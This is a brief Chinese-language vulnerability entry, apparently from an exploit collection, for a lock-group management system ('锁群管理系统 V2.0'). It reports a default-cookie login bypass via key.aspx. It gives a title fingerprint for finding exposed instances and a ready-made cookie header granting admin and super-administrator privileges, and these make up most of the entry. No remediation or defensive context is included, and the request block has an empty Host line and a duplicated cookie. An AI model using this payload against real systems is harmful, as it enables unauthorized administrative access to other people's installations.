# 锁群管理系统key.aspx存在默认cookie登录漏洞

- **系统**：锁群管理系统　|　**类型**：其他　|　**CVE**：—
- **指纹**：`title=="锁群管理系统 V2.0"`
- **请求**：`GET /key.aspx HTTP/1.1`

**请求体 / payload**
```
在任意接口写入默认cookie用以登录绕过
Cookie: ASP.NET_SessionId=evadd1jksrepp4gtbgockcbi; username=admin; power=1; powerName=%e8%b6%85%e7%ba%a7%e7%ae%a1%e7%90%86%e5%91%98; code=admin
Host:
Cookie: ASP.NET_SessionId=evadd1jksrepp4gtbgockcbi; username=admin; power=1; powerName=%e8%b6%85%e7%ba%a7%e7%ae%a1%e7%90%86%e5%91%98; code=admin
Priority: u=4
```
- **预期**：200　|　—